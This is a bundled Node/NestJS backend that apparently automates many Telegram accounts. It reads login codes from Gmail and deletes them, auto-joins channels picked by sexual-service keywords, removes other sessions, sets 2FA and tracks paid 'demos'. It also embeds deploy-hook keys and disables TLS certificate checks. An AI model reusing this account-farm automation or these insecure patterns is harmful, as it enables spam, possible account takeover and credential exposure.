      }
      catch (e) {
        console.log(new Date(Date.now()).toLocaleString('en-IN', timeOptions), 'ChatGPT', ` NOT Reachable`);
        await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${ppplbot()}&text=ChatGPT  NOT Reachable`);
        try {
          const resp = await axios__WEBPACK_IMPORTED_MODULE_2___default().get(`https://api.render.com/deploy/srv-cflkq853t39778sm0clg?key=e4QNTs9kDw4`, { timeout: 55000 });
          if (resp?.status == 200 || resp.status == 201) {
            await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${ppplbot()}&text=Restarted CHATGPT`);
          }
        } catch (error) {
          console.log("Cannot restart ChatGpt server");
          await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${ppplbot()}&text=Cannot restart ChatGpt server`);
        }
      }
      try {
        const resp = await axios__WEBPACK_IMPORTED_MODULE_2___default().get(`${process.env.uptimeChecker}`, { timeout: 55000 });
      }
      catch (e) {
        console.log(new Date(Date.now()).toLocaleString('en-IN', timeOptions), 'UpTimeBot', ` NOT Reachable`);
        await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${ppplbot()}&text=${process.env.uptimeChecker}  NOT Reachable `);
        try {
          const resp = await axios__WEBPACK_IMPORTED_MODULE_2___default().get(`https://api.render.com/deploy/srv-cgqhefceooggt0ofkih0?key=CL2p5mx56c0`, { timeout: 55000 });
          if (resp?.status == 200 || resp.status == 201) {
            await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${ppplbot()}&text=Restarted ${process.env.uptimeChecker}`);
          }
        } catch (error) {
          console.log("Cannot restart ChatGpt server");
          await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${ppplbot()}&text=Cannot restart ${process.env.uptimeChecker} server`);
        }
      }
      try {
        const resp = await axios__WEBPACK_IMPORTED_MODULE_2___default().get(`https://tgsignup.onrender.com/`, { timeout: 55000 });
      }
      catch (e) {
        console.log(new Date(Date.now()).toLocaleString('en-IN', timeOptions), 'ChatGPT', ` NOT Reachable`);
        await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${ppplbot()}&text=TgSignup  NOT Reachable`);
      }

      try {
        const resp = await axios__WEBPACK_IMPORTED_MODULE_2___default().get(`https://ramyaaa.onrender.com/`, { timeout: 55000 });
      }
      catch (e) {
        console.log(new Date(Date.now()).toLocaleString('en-IN', timeOptions), 'uptime2', ` NOT Reachable`);
        await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${ppplbot()}&text=uptime2  NOT Reachable`);
      }
      // }
      try {
        const num = Math.floor(Math.random() * 101);
        const resp2 = await axios__WEBPACK_IMPORTED_MODULE_2___default().get(`https://execuor-production.up.railway.app/?num=${num}`, { timeout: 55000 });
        console.log(resp2.data)
        if (parseInt(resp2.data?.num || 0) !== num + 3) {
          await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${ppplbot()}&text=REPLIT Manipulated`);
        }
      } catch (e) {
        console.log(new Date(Date.now()).toLocaleString('en-IN', timeOptions), 'REPLIT', ` NOT Reachable`);
        await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${ppplbot()}&text=REPLIT  NOT Reachable`);
      }
    }, 60000);

    // setInterval(async () => {
    //   userMap.forEach(async (val, key) => {
    //     if (val.timeStamp + 230000 < Date.now()) {
    //       userMap.set(key, { ...val, timeStamp: Date.now() });
    //       try {
    //         await fetchWithTimeout(`${ ppplbot() } & text=${ key } is DOWN!!`, { timeout: 10000 });
    //         await fetchWithTimeout(`${ val.url }`, { timeout: 10000 });
    //         try {
    //           const resp = await fetchWithTimeout(`${ val.url }checkHealth`, { timeout: 10000 });
    //           if (resp.status === 200 || resp.status === 201) {
    //             if (resp.data.status === apiResp.ALL_GOOD || resp.data.status === apiResp.WAIT) {
    //               console.log(resp.data.userName, ': All good');
    //             } else {
    //               console.log(resp.data.userName, ': DIAGNOSE - HealthCheck - ', resp.data.status);
    //               await fetchWithTimeout(`${ ppplbot() } & text=${(resp.data.userName).toUpperCase()}: HealthCheckError - ${ resp.data.status } `);
    //               try {
    //                 const connectResp = await fetchWithTimeout(`${ val.url } tryToConnect`, { timeout: 10000 });
    //                 console.log(connectResp.data.userName, ': RetryResp - ', connectResp.data.status);
    //                 await fetchWithTimeout(`${ ppplbot() }& text=${ (connectResp.data.userName).toUpperCase() }: RetryResponse - ${ connectResp.data.status } `);
    //               } catch (e) {
    //                 s
    //                 console.log(val.url, `CONNECTION RESTART FAILED!!`);
    //               }
    //             }
    //           } else {
    //             console.log(val.url, `is unreachable!!`);
    //           }
    //         } catch (e) {
    //           console.log(val.url, `is unreachable!!`);
    //           //console.log(parseError(e))
    //         }
    //       } catch (e) {
    //         console.log(parseError(e))
    //       }
    //     }
    //   })
    // }, 50000);
  }

  async restart(userName, processId) {
    const data = userMap.get(userName);
    console.log(data, userName);
    const url = data?.url;
    if (url) {
      userMap.set(userName, { ...data, timeStamp: Date.now() });
      try {
        //await fetchWithTimeout(`${ ppplbot() }& text=${ userName } is DOWN!!`, { timeout: 10000 });
        //await fetchWithTimeout(`${ url } `, { timeout: 10000 });
        try {
          console.log('Checking Health')
          const resp = await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${url} checkHealth`, { timeout: 10000 });
          if (resp.status === 200 || resp.status === 201) {
            if (resp.data.status === apiResp.ALL_GOOD || resp.data.status === apiResp.WAIT) {
              console.log(resp.data.userName, ': All good');
            } else {
              console.log(resp.data.userName, ': DIAGNOSE - HealthCheck - ', resp.data.status);
              await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${ppplbot()}& text=${(resp.data.userName).toUpperCase()}: HealthCheckError - ${resp.data.status} `);
              try {
                const connectResp = await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${url}tryToConnect/${processId} `, { timeout: 10000 });
                console.log(connectResp.data.userName, ': RetryResp - ', connectResp.data.status);
                await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${ppplbot()}& text=${(connectResp.data.userName).toUpperCase()}: RetryResponse - ${connectResp.data.status} `);
              } catch (e) {
                console.log((0,_utils__WEBPACK_IMPORTED_MODULE_7__.parseError)(e))
                console.log(url, `CONNECTION RESTART FAILED!!`);
              }
            }
          } else {
            console.log(url, `is unreachable!!`);
          }
        } catch (e) {
          console.log(url, `is unreachable!!`);
          //console.log(parseError(e))
        }
      }
      catch (e) {
        console.log((0,_utils__WEBPACK_IMPORTED_MODULE_7__.parseError)(e))
      }
    }
    else {
      console.log('url is undefined');
    }
  }
}

function extractNumberFromString(inputString) {
  const regexPattern = /\d+/;
  const matchResult = inputString?.match(regexPattern);
  if (matchResult && matchResult.length > 0) {
    // Parse the matched string into a number and return it
    return parseInt(matchResult[0], 10);
  }
  // If no number is found, return null
  return null;
}

async function createInitializedObject() {
  const initializedObject = {};
  const db = _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance();
  const users = await db.getAllUserClients();
  for (const user of users) {
    if (extractNumberFromString(user.clientId))
      initializedObject[user.clientId.toUpperCase()] = {
        profile: user.clientId.toUpperCase(),
        totalCount: 0,
        totalPaid: 0,
        totalOldPaid: 0,
        oldPaidDemo: 0,
        totalpendingDemos: 0,
        oldPendingDemos: 0,
        totalNew: 0,
        totalNewPaid: 0,
        newPaidDemo: 0,
        newPendingDemos: 0,
        names: "",
        fullShowPPl: 0,
        fullShowNames: ""
      }
  }

  return initializedObject;
}

async function getPromotionStatsPlain() {
  let resp = '';
  const db = _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance();
  const result = await db.readPromoteStats();
  for (const data of result) {
    resp += `${data.client.toUpperCase()} : ${data.totalCount} ${data.totalCount > 0 ? ` | ${Number((Date.now() - data.lastUpdatedTimeStamp) / (1000 * 60)).toFixed(2)}` : ''}`;
  }
  return resp;
}

async function getPromotionStats() {
  let resp = '';
  const db = _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance();
  const result = await db.readPromoteStats();
  for (const data of result) {
    resp += `${data.client.toUpperCase()} : <b>${data.totalCount}</b>${data.totalCount > 0 ? ` | ${Number((Date.now() - data.lastUpdatedTimeStamp) / (1000 * 60)).toFixed(2)}` : ''}<br>`;
  }
  return resp;
}

async function getPromotionStatsHtml() {
  let resp = '<html><head><style>pre { font-size: 18px; }</style></head><body><pre>';
  resp = resp + await getPromotionStats();
  resp += '</pre></body></html>';
  return resp;
}

async function getData() {
  const profileData = await createInitializedObject();
  const db = await _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance();
  let entries = await db.readStats();
  // console.log(Object.keys(profileData));
  for (const entry of entries) {
    const { count, newUser, payAmount, demoGivenToday, demoGiven, profile, client, name, secondShow } = entry;

    // console.log(profile.toUpperCase(), profileData[profile.toUpperCase()])
    if (client && profileData[client.toUpperCase()]) {
      const userData = profileData[client.toUpperCase()];
      userData.totalCount += count;
      userData.totalPaid += payAmount > 0 ? 1 : 0;
      userData.totalOldPaid += (payAmount > 0 && !newUser) ? 1 : 0;
      userData.oldPaidDemo += (demoGivenToday && !newUser) ? 1 : 0;
      userData.totalpendingDemos += (payAmount > 25 && !demoGiven) ? 1 : 0;
      userData.oldPendingDemos += (payAmount > 25 && !demoGiven && !newUser) ? 1 : 0;
      if (payAmount > 25 && !demoGiven) {
        userData.names = userData.names + ` ${name} |`
      }

      if (demoGiven && ((payAmount > 90 && !secondShow) || (payAmount > 150 && secondShow))) {
        userData.fullShowPPl++;
        userData.fullShowNames = userData.fullShowNames + ` ${name} |`
      }

      if (newUser) {
        userData.totalNew += 1;
        userData.totalNewPaid += payAmount > 0 ? 1 : 0;
        userData.newPaidDemo += demoGivenToday ? 1 : 0;
        userData.newPendingDemos += (payAmount > 25 && !demoGiven) ? 1 : 0;
      }
    }
  }
  const profileDataArray = Object.entries(profileData);
  profileDataArray.sort((a, b) => b[1].totalpendingDemos - a[1].totalpendingDemos);
  let reply = '';
  for (const [profile, userData] of profileDataArray) {
    reply += `${profile.toUpperCase()} : <b>${userData.totalpendingDemos}</b> | ${userData.names}<br>`;
  }

  profileDataArray.sort((a, b) => b[1].fullShowPPl - a[1].fullShowPPl);
  let reply2 = '';
  for (const [profile, userData] of profileDataArray) {
    reply2 += `${profile.toUpperCase()} : <b>${userData.fullShowPPl}</b> |${userData.fullShowNames}<br>`;
  }

  let reply3 = await getPromotionStats()

  return (
    `<div>
      <div style="display: flex; margin-bottom: 60px">
        <div style="flex: 1;">${reply}</div>
        <div style="flex: 1; ">${reply2}</div>
      </div>
      <div style="display: flex;">
        <div style="flex: 1; " >${reply3}</div>
      </div>
    </div>`
  );
}
function pushToconnectionQueue(userName, processId) {
  const existingIndex = connetionQueue.findIndex(entry => entry.userName === userName);
  if (existingIndex !== -1) {
    connetionQueue[existingIndex].processId = processId;
  } else {
    connetionQueue.push({ userName, processId });
  }
}


async function joinchannels(value) {
  try {
    let resp = await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${value.url}channelinfo`, { timeout: 200000 });
    await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${(ppplbot())}&text=ChannelCount SendTrue - ${value.clientId}: ${resp.data.canSendTrueCount}`)
    if (resp?.data?.canSendTrueCount && resp?.data?.canSendTrueCount < 300) {
      await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${ppplbot()}&text=Started Joining Channels- ${value.clientId}`)
      const keys = ['wife', 'adult', 'lanj', 'servic', 'paid', 'randi', 'bhab', 'boy', 'girl'];
      const db = _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance();
      const channels = await db.getActiveChannels(100, 0, keys, resp.data?.ids, 'activeChannels');
      for (const channel of channels) {
        try {
          console.log(channel.username);
          const username = channel?.username?.replace("@", '');
          if (username) {
            (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${value.url}joinchannel?username=${username}`);
            await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.sleep)(200000);
          }
        } catch (error) {
          console.log("Some Error: ", (0,_utils__WEBPACK_IMPORTED_MODULE_7__.parseError)(error), error)
        }
      }
    }
  } catch (error) {
    console.log((0,_utils__WEBPACK_IMPORTED_MODULE_7__.parseError)(error))
  }
}

__webpack_async_result__();
} catch(e) { __webpack_async_result__(e); } }, 1);

/***/ }),

/***/ "./mailreader.js":
/*!***********************!*\
  !*** ./mailreader.js ***!
  \***********************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   connectToMail: () => (/* binding */ connectToMail),
/* harmony export */   disconnectfromMail: () => (/* binding */ disconnectfromMail),
/* harmony export */   fetchNumbersFromString: () => (/* binding */ fetchNumbersFromString),
/* harmony export */   getcode: () => (/* binding */ getcode),
/* harmony export */   isMailReady: () => (/* binding */ isMailReady)
/* harmony export */ });
/* harmony import */ var imap__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! imap */ "imap");
/* harmony import */ var imap__WEBPACK_IMPORTED_MODULE_0___default = /*#__PURE__*/__webpack_require__.n(imap__WEBPACK_IMPORTED_MODULE_0__);

console.log("Started Mail Reader")
let isReady = false;

function isMailReady() {
    return isReady;
}

const imap = new (imap__WEBPACK_IMPORTED_MODULE_0___default())({
    user: process.env.GMAIL_ADD,
    password: process.env.GMAIL_PASS,
    host: 'imap.gmail.com',
    port: 993,
    tls: true,
    tlsOptions: {
        rejectUnauthorized: false
    }

});

async function openInbox(cb) {
    imap.openBox('INBOX', false, cb);
}

imap.once('ready', function () {
    console.log("ready")
    isReady = true;
    return true
});

imap.once('error', (err) => {
    console.error("SomeError :", err);
});

imap.once('end', () => {
    console.log('Connection ended');
});
let result = ''
async function getcode() {
    await openInbox(() => {
        const searchCriteria = [['FROM', 'noreply@telegram.org']];
        const fetchOptions = {
            bodies: ['HEADER', 'TEXT'],
            markSeen: true,
        };
        imap.search(searchCriteria, (err, results) => {
            if (err) throw err;
            console.log(results)
            if (results.length > 0) {
                const fetch = imap.fetch([results[results.length - 1]], fetchOptions);
                fetch.on('message', (msg, seqno) => {
                    const emailData = [];

                    msg.on('body', (stream, info) => {
                        let buffer = '';

                        stream.on('data', (chunk) => {
                            buffer += chunk.toString('utf8');
                        });

                        stream.on('end', () => {
                            if (info.which === 'TEXT') {
                                emailData.push(buffer);
                            }
                            imap.seq.addFlags([seqno], '\\Deleted', (err) => {
                                if (err) throw err;
                                imap.expunge((err) => {
                                    if (err) throw err;
                                    console.log(`Deleted message`);
                                });
                            });
                        });
                    });

                    msg.once('end', () => {
                        console.log(`Email #${seqno}, Latest${results[results.length - 1]}`);
                        console.log("EmailDataLength: ", emailData.length);
                        console.log("Mail:", emailData[emailData.length - 1].split('.'));
                        result = fetchNumbersFromString(emailData[emailData.length - 1].split('.')[0])
                    });
                });
                fetch.once('end', () => {
                    console.log("fetched mails")
                });
            }
        });
    });
    console.log("Returning from mail Reader:", result);
    if (result.length > 4) {
        imap.end();
    }
    return result
}

function fetchNumbersFromString(inputString) {
    const regex = /\d+/g;
    const matches = inputString.match(regex);
    if (matches) {
        const result = matches.join('');
        return result;
    } else {
        return '';
    }
}
function connectToMail() {
    result = '';
    imap.connect();
}
function disconnectfromMail() {
    result = '';
    imap.end();
}


/***/ }),

/***/ "./nest/IMap/IMap.ts":
/*!***************************!*\
  !*** ./nest/IMap/IMap.ts ***!
  \***************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.MailReader = void 0;
const imap_1 = __importDefault(__webpack_require__(/*! imap */ "imap"));
const utils_1 = __webpack_require__(/*! ../../utils */ "./utils.js");
class MailReader {
    constructor() {
        this.isReady = false;
        this.result = '';
        this.imap = new imap_1.default({
            user: process.env.GMAIL_ADD,
            password: process.env.GMAIL_PASS,
            host: 'imap.gmail.com',
            port: 993,
            tls: true,
            tlsOptions: {
                rejectUnauthorized: false,
            },
        });
        this.imap.once('ready', () => {
            console.log('Ready');
            this.isReady = true;
        });
        this.imap.once('error', (err) => {
            console.error('SomeError:', err);
        });
        this.imap.once('end', () => {
            console.log('Connection ended');
        });
    }
    static getInstance() {
        if (!MailReader.instance) {
            MailReader.instance = new MailReader();
        }
        return MailReader.instance;
    }
    connectToMail() {
        return __awaiter(this, void 0, void 0, function* () {
            console.log('Connecting to mail server');
            const result = yield new Promise((resolve, reject) => {
                this.imap.connect((err) => {
                    if (err) {
                        console.log((0, utils_1.parseError)(err));
                        reject(err);
                        return;
                    }
                    console.log('Connected to mail server');
                    resolve(true);
                });
            });
            console.log(result);
        });
    }
    disconnectFromMail() {
        return __awaiter(this, void 0, void 0, function* () {
            yield new Promise((resolve, reject) => {
                this.imap.end((err) => {
                    if (err) {
                        console.log((0, utils_1.parseError)(err));
                        reject(err);
                        return;
                    }
                    console.log('Disconnected from mail server');
                    resolve();
                });
            });
        });
    }
    isMailReady() {
        return __awaiter(this, void 0, void 0, function* () {
            return this.isReady;
        });
    }
    getCode() {
        return __awaiter(this, void 0, void 0, function* () {
            if (!this.isReady) {
                throw new Error('Mail reader is not ready. Call connectToMail() first.');
            }
            try {
                yield this.openInbox();
                const searchCriteria = [['FROM', 'noreply@telegram.org']];
                const fetchOptions = {
                    bodies: ['HEADER', 'TEXT'],
                    markSeen: true,
                };
                console.log('Inbox Opened');
                try {
                    const results = yield new Promise((resolve, reject) => {
                        this.imap.search(searchCriteria, (err, results) => {
                            if (err) {
                                console.log((0, utils_1.parseError)(err));
                                reject(err);
                                return;
                            }
                            resolve(results);
                        });
                    });
                    if (results.length > 0) {
                        console.log('Emails found', results.length);
                        const length = results.length;
                        const fetch = this.imap.fetch([results[length - 1]], fetchOptions);
                        yield new Promise((resolve, reject) => {
                            fetch.on('message', (msg, seqno) => {
                                const emailData = [];
                                msg.on('body', (stream, info) => {
                                    let buffer = '';
                                    stream.on('data', (chunk) => {
                                        buffer += chunk.toString('utf8');
                                    });
                                    stream.on('end', () => {
                                        if (info.which === 'TEXT') {
                                            emailData.push(buffer);
                                        }
                                        this.imap.seq.addFlags([seqno], '\\Deleted', (err) => {
                                            if (err) {
                                                reject(err);
                                                return;
                                            }
                                            this.imap.expunge((err) => {
                                                if (err) {
                                                    reject(err);
                                                    return;
                                                }
                                                console.log(`Deleted message`);
                                            });
                                        });
                                    });
                                });
                                msg.once('end', () => {
                                    console.log(`Email #${seqno}, Latest ${results[length - 1]}`);
                                    console.log('EmailDataLength:', emailData.length);
                                    console.log('Mail:', emailData[emailData.length - 1].split('.'));
                                    this.result = this.fetchNumbersFromString(emailData[emailData.length - 1].split('.')[0]);
                                    resolve();
                                });
                            });
                            fetch.once('end', () => {
                                console.log('Fetched mails');
                                resolve();
                            });
                        });
                    }
                    else {
                        console.log('No new emails found');
                    }
                }
                catch (err) {
                    console.error('Error:', err);
                    throw err; // Re-throw the error for caller to handle
                }
                console.log('returning result:', this.result);
                return this.result;
            }
            catch (error) {
                console.log('In Error');
                const errorDetails = (0, utils_1.parseError)(error);
                return undefined;
            }
        });
    }
    openInbox() {
        return __awaiter(this, void 0, void 0, function* () {
            yield new Promise((resolve, reject) => {
                this.imap.openBox('INBOX', false, (err) => {
                    if (err) {
                        console.log((0, utils_1.parseError)(err));
                        reject(err);
                        return;
                    }
                    console.log('Inbox opened');
                    resolve();
                });
            });
        });
    }
    fetchNumbersFromString(inputString) {
        const regex = /\d+/g;
        const matches = inputString.match(regex);
        if (matches) {
            return matches.join('');
        }
        else {
            return '';
        }
    }
}
exports.MailReader = MailReader;


/***/ }),

/***/ "./nest/app.module.ts":
/*!****************************!*\
  !*** ./nest/app.module.ts ***!
  \****************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.AppModule = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const users_module_1 = __webpack_require__(/*! ./components/users/users.module */ "./nest/components/users/users.module.ts");
const user_data_module_1 = __webpack_require__(/*! ./components/user-data/user-data.module */ "./nest/components/user-data/user-data.module.ts");
const client_module_1 = __webpack_require__(/*! ./components/clients/client.module */ "./nest/components/clients/client.module.ts");
const Telegram_module_1 = __webpack_require__(/*! ./components/Telegram/Telegram.module */ "./nest/components/Telegram/Telegram.module.ts");
const buffer_client_module_1 = __webpack_require__(/*! ./components/buffer-clients/buffer-client.module */ "./nest/components/buffer-clients/buffer-client.module.ts");
const activechannels_module_1 = __webpack_require__(/*! ./components/activechannels/activechannels.module */ "./nest/components/activechannels/activechannels.module.ts");
const configuration_module_1 = __webpack_require__(/*! ./components/confguration/configuration.module */ "./nest/components/confguration/configuration.module.ts");
let AppModule = class AppModule {
};
exports.AppModule = AppModule;
exports.AppModule = AppModule = __decorate([
    (0, common_1.Module)({
        imports: [
            mongoose_1.MongooseModule.forRootAsync({
                useFactory: () => __awaiter(void 0, void 0, void 0, function* () {
                    return ({
                        uri: process.env.mongouri,
                    });
                }),
            }),
            configuration_module_1.ConfigurationModule,
            activechannels_module_1.ActiveChannelsModule,
            client_module_1.ClientModule,
            user_data_module_1.UserDataModule,
            users_module_1.UsersModule,
            Telegram_module_1.TelegramModule,
            buffer_client_module_1.BufferClientModule,
        ],
    })
], AppModule);


/***/ }),

/***/ "./nest/components/Telegram/Telegram.controller.ts":
/*!*********************************************************!*\
  !*** ./nest/components/Telegram/Telegram.controller.ts ***!
  \*********************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.TelegramController = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const Telegram_service_1 = __webpack_require__(/*! ./Telegram.service */ "./nest/components/Telegram/Telegram.service.ts");
let TelegramController = class TelegramController {
    constructor(telegramService) {
        this.telegramService = telegramService;
    }
    connectToTelegram(mobile) {
        return __awaiter(this, void 0, void 0, function* () {
            return yield this.telegramService.createClient(mobile);
        });
    }
    connectClient(mobile) {
        return __awaiter(this, void 0, void 0, function* () {
            yield this.connectToTelegram(mobile);
            return 'Client connected successfully';
        });
    }
    getMessages(mobile_1, username_1) {
        return __awaiter(this, arguments, void 0, function* (mobile, username, limit = 8) {
            yield this.connectToTelegram(mobile);
            return this.telegramService.getMessages(mobile, username, limit);
        });
    }
    getChatId(mobile, username) {
        return __awaiter(this, void 0, void 0, function* () {
            yield this.connectToTelegram(mobile);
            return yield this.telegramService.getChatId(mobile, username);
        });
    }
    joinChannels(mobile, channels) {
        return __awaiter(this, void 0, void 0, function* () {
            yield this.connectToTelegram(mobile);
            this.telegramService.joinChannels(mobile, channels);
            return 'Channels joined successfully';
        });
    }
    removeOtherAuths(mobile) {
        return __awaiter(this, void 0, void 0, function* () {
            yield this.connectToTelegram(mobile);
            yield this.telegramService.removeOtherAuths(mobile);
            return 'Authorizations removed successfully';
        });
    }
    getSelfMsgsInfo(mobile) {
        return __awaiter(this, void 0, void 0, function* () {
            yield this.connectToTelegram(mobile);
            return yield this.telegramService.getSelfMsgsInfo(mobile);
        });
    }
    getChannelInfo(mobile_1) {
        return __awaiter(this, arguments, void 0, function* (mobile, sendIds = false) {
            yield this.connectToTelegram(mobile);
            return yield this.telegramService.getChannelInfo(mobile, sendIds);
        });
    }
    getAuths(mobile) {
        return __awaiter(this, void 0, void 0, function* () {
            yield this.connectToTelegram(mobile);
            return yield this.telegramService.getAuths(mobile);
        });
    }
    set2Fa(mobile) {
        return __awaiter(this, void 0, void 0, function* () {
            yield this.connectToTelegram(mobile);
            return yield this.telegramService.set2Fa(mobile);
        });
    }
    setProfilePic(mobile, name) {
        return __awaiter(this, void 0, void 0, function* () {
            yield this.connectToTelegram(mobile);
            return yield this.telegramService.setProfilePic(mobile, name);
        });
    }
    setAsBufferClient(mobile) {
        return __awaiter(this, void 0, void 0, function* () {
            yield this.connectToTelegram(mobile);
            return yield this.telegramService.setAsBufferClient(mobile);
        });
    }
    updatePrivacy(mobile) {
        return __awaiter(this, void 0, void 0, function* () {
            yield this.connectToTelegram(mobile);
            return yield this.telegramService.updatePrivacy(mobile);
        });
    }
    updateUsername(mobile, username) {
        return __awaiter(this, void 0, void 0, function* () {
            yield this.connectToTelegram(mobile);
            return yield this.telegramService.updateUsername(mobile, username);
        });
    }
    updateName(mobile, firstName, about) {
        return __awaiter(this, void 0, void 0, function* () {
            yield this.connectToTelegram(mobile);
            return yield this.telegramService.updateNameandBio(mobile, firstName, about);
        });
    }
};
exports.TelegramController = TelegramController;
__decorate([
    (0, common_1.Get)('connect/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Create and connect a new Telegram client' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true })
    //@apiresponse({ status: 201, description: 'Client connected successfully' })
    //@apiresponse({ status: 400, description: 'Bad request' })
    ,
    __param(0, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "connectClient", null);
__decorate([
    (0, common_1.Get)('messages/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Get messages from Telegram' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiQuery)({ name: 'username', description: 'Username to fetch messages from', required: true }),
    (0, swagger_1.ApiQuery)({ name: 'limit', description: 'Limit the number of messages', required: false })
    //@apiresponse({ status: 200, description: 'Messages fetched successfully' })
    //@apiresponse({ status: 400, description: 'Bad request' })
    ,
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Query)('username')),
    __param(2, (0, common_1.Query)('limit')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String, Number]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "getMessages", null);
__decorate([
    (0, common_1.Get)('chatid/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Get chat ID for a username' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiQuery)({ name: 'username', description: 'Username to fetch chat ID for', required: true })
    //@apiresponse({ status: 200, description: 'Chat ID fetched successfully' })
    //@apiresponse({ status: 400, description: 'Bad request' })
    ,
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Query)('username')),
